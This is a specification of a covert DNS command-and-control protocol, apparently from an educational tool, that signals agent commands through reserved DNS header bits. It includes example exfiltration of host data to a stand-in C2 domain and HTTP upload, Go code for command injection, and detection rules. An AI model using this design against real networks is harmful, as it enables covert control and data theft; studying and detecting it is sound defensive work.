# Z-Value Command Protocol

This document provides a detailed specification of the Z-value covert command signaling mechanism used by Spinnekop.

## Background

### The DNS Header

Every DNS message begins with a 12-byte header containing control flags. RFC 1035 defines the header structure:

```
                                1  1  1  1  1  1
  0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                      ID                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    QDCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ANCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    NSCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ARCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

### The Reserved Z Bits

Bits 9-11 of the flags field are designated "Z" (Zero) and are defined in RFC 1035 as:

> "Reserved for future use. Must be zero in all queries and responses."

This creates an opportunity:

1. **Legitimate DNS** always sets Z=0
2. **Security tools** rarely inspect Z bits
3. **DNS resolvers** typically pass Z bits unchanged
4. **Attackers** can use Z bits for covert signaling

### Historical Context: SUNBURST

The SUNBURST malware (discovered December 2020) demonstrated this technique in the wild. Spinnekop implements a similar approach for educational purposes.

## Protocol Specification

### Z-Value Encoding

The Z field is 3 bits, allowing values 0-7:

```
Bits:    9   10   11
       +---+---+---+
       | Z2| Z1| Z0|  = 0-7 decimal
       +---+---+---+

Z = (Z2 * 4) + (Z1 * 2) + Z0
```

### Command Definitions

| Z-Value | Binary | Command | Agent Action |
|---------|--------|---------|--------------|
| 0 | `000` | CONTINUE | Continue normal beaconing |
| 1 | `001` | SLEEP | Enter extended sleep (1 hour default) |
| 2 | `010` | ENUMERATE | Enable subdomain data encoding |
| 3 | `011` | HTTP_MODE | Switch to HTTPS channel |
| 4 | `100` | RESERVED | Future use |
| 5 | `101` | RESERVED | Future use |
| 6 | `110` | RESERVED | Future use |
| 7 | `111` | TERMINATE | Agent self-termination |

### Command Details

#### Z=0: CONTINUE

**Purpose**: Standard acknowledgment, continue operations.

**Agent Behavior**:
1. Process any pending local tasks
2. Sleep for `baseInterval ± jitter`
3. Send next beacon

**Use Case**: Normal operation when no commands are queued.

#### Z=1: SLEEP

**Purpose**: Reduce activity to avoid detection.

**Agent Behavior**:
1. Enter extended sleep period (default: 1 hour)
2. No network activity during sleep
3. Resume beaconing after sleep

**Use Case**: When operator detects potential discovery or wants to reduce footprint.

#### Z=2: ENUMERATE

**Purpose**: Request target information via DNS subdomain encoding.

**Agent Behavior**:
1. Collect system information:
   - Hostname
   - Username
   - Domain membership
   - OS version
   - Network interfaces
2. Encode data as Base64
3. Send as subdomain labels in subsequent queries

**Example Encoding**:
```
Data:    "DESKTOP-XYZ\Admin"
Base64:  "REVTS1RPUC1YWVpcQWRtaW4="
Query:   REVTS1RPUC1YWVpcQWRtaW4.c2domain.com
```

**Use Case**: Initial reconnaissance after establishing persistence.

#### Z=3: HTTP_MODE

**Purpose**: Switch to high-bandwidth HTTPS channel for data exfiltration.

**Agent Behavior**:
1. Resolve HTTP endpoint (may use DNS-provided IP)
2. Verify connectivity with GET request
3. Begin chunked file upload
4. Return to DNS beaconing after transfer

**Transfer Protocol**:
```
POST /upload HTTP/1.1
Host: c2server:8080
Content-Type: application/octet-stream
X-Agent-ID: <unique_id>
X-Chunk: <chunk_number>
X-Total: <total_chunks>

<base64_encoded_chunk>
```

**Use Case**: Exfiltrating large files (documents, databases, etc.)

#### Z=7: TERMINATE

**Purpose**: Signal agent to self-destruct.

**Agent Behavior**:
1. Stop all network activity
2. Clean up artifacts (if configured)
3. Exit process

**Use Case**: Emergency extraction or avoiding forensic analysis.

## Implementation Details

### Server-Side Z-Value Injection

```go
// Extract query and prepare response
func handleDNSQuery(w dns.ResponseWriter, r *dns.Msg) {
    m := new(dns.Msg)
    m.SetReply(r)

    // Get agent identifier from query
    agentID := extractAgentID(r.Question[0].Name)

    // Get next command from scheduler
    zValue := scheduler.GetNextCommand(agentID)

    // Inject Z-value into response header
    // The Zero field is the Z bits
    m.MsgHdr.Zero = zValue != 0

    // For values > 1, we need to manipulate the raw bytes
    // This is handled in the DNS library wrapper
    setZValue(m, zValue)

    // Add standard A record answer
    m.Answer = append(m.Answer, createARecord(r.Question[0].Name))

    w.WriteMsg(m)
}
```

### Agent-Side Z-Value Extraction

```go
func extractZValue(response *dns.Msg) uint8 {
    // DNS library exposes Zero as boolean
    // For full 3-bit value, parse raw response

    // Method 1: Using library (only detects Z != 0)
    if response.MsgHdr.Zero {
        return parseFullZValue(response)
    }
    return 0

    // Method 2: Parse raw bytes (recommended)
    flags := binary.BigEndian.Uint16(rawResponse[2:4])
    zValue := uint8((flags >> 4) & 0x7)
    return zValue
}
```

### Command Queue Management

```go
type CommandQueue struct {
    mu       sync.Mutex
    commands map[string][]uint8  // agentID -> command queue
}

func (q *CommandQueue) Enqueue(agentID string, zValue uint8) {
    q.mu.Lock()
    defer q.mu.Unlock()
    q.commands[agentID] = append(q.commands[agentID], zValue)
}

func (q *CommandQueue) Dequeue(agentID string) uint8 {
    q.mu.Lock()
    defer q.mu.Unlock()

    if cmds, ok := q.commands[agentID]; ok && len(cmds) > 0 {
        cmd := cmds[0]
        q.commands[agentID] = cmds[1:]
        return cmd
    }
    return 0  // CONTINUE
}
```

## Wire Format

### Standard DNS Response (Z=0)

```
Bytes 0-1:   Transaction ID
Bytes 2-3:   Flags = 0x8180 (standard response, no error)
             Binary: 1000 0001 1000 0000
                     QR=1, OPCODE=0, AA=0, TC=0, RD=1, RA=1, Z=0, RCODE=0
```

### Modified Response (Z=2)

```
Bytes 0-1:   Transaction ID
Bytes 2-3:   Flags = 0x81A0 (response with Z=2)
             Binary: 1000 0001 1010 0000
                     QR=1, OPCODE=0, AA=0, TC=0, RD=1, RA=1, Z=2, RCODE=0
                                                          ^^^
                                                          Z bits = 010 = 2
```

### Bit-Level Breakdown

```
Standard Response Flags (Z=0):
┌────┬───────────┬────┬────┬────┬────┬─────────┬───────────┐
│ QR │  OPCODE   │ AA │ TC │ RD │ RA │    Z    │   RCODE   │
│  1 │  0 0 0 0  │  0 │  0 │  1 │  1 │ 0  0  0 │ 0 0 0 0   │
└────┴───────────┴────┴────┴────┴────┴─────────┴───────────┘
                                       └──┴──┴──┘
                                       Z = 0 (continue)

Modified Response Flags (Z=2):
┌────┬───────────┬────┬────┬────┬────┬─────────┬───────────┐
│ QR │  OPCODE   │ AA │ TC │ RD │ RA │    Z    │   RCODE   │
│  1 │  0 0 0 0  │  0 │  0 │  1 │  1 │ 0  1  0 │ 0 0 0 0   │
└────┴───────────┴────┴────┴────┴────┴─────────┴───────────┘
                                       └──┴──┴──┘
                                       Z = 2 (enumerate)
```

## Detection

### Network Detection

Non-zero Z-values are a clear protocol violation. Any properly implemented DNS monitor can detect this:

**Zeek Script**:
```zeek
event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) {
    local flags = msg$flags;
    local z_value = (flags / 16) % 8;

    if (z_value != 0) {
        NOTICE([
            $note=DNS::Covert_Channel,
            $msg=fmt("DNS Z-flag abuse detected: Z=%d", z_value),
            $conn=c,
            $identifier=cat(c$id$orig_h, c$id$resp_h)
        ]);
    }
}
```

**Wireshark Filter**:
```
dns.flags.z != 0
```

**tcpdump + Python**:
```python
from scapy.all import *

def check_z_flag(pkt):
    if pkt.haslayer(DNS):
        # Extract flags (bytes 2-3 of DNS layer)
        flags = pkt[DNS].flags
        z_value = (flags >> 4) & 0x7
        if z_value != 0:
            print(f"Z-flag anomaly: {pkt[IP].src} -> {pkt[IP].dst}, Z={z_value}")

sniff(filter="udp port 53", prn=check_z_flag)
```

### Limitations of Detection

While Z-flag abuse is technically easy to detect, real-world challenges include:

1. **Volume**: High DNS traffic makes analysis difficult
2. **Encryption**: DoH/DoT hides DNS payload
3. **Tooling**: Many tools don't inspect Z bits by default
4. **Awareness**: Defenders may not know to look

## Security Analysis

### Advantages for Attackers

- **Low visibility**: Z bits rarely inspected
- **Protocol compliant**: Response otherwise valid
- **Firewall bypass**: DNS typically allowed
- **Plausible deniability**: Could be "implementation bug"

### Disadvantages for Attackers

- **RFC violation**: Clear indicator if detected
- **Limited bandwidth**: Only 3 bits per response
- **Logging**: DNS queries often logged
- **Caching**: Responses may be cached (reduces control)

## References

- [RFC 1035 - Domain Names: Implementation and Specification](https://tools.ietf.org/html/rfc1035)
- [SUNBURST Technical Analysis (Microsoft)](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)
- [MITRE ATT&CK T1071.004 - DNS](https://attack.mitre.org/techniques/T1071/004/)
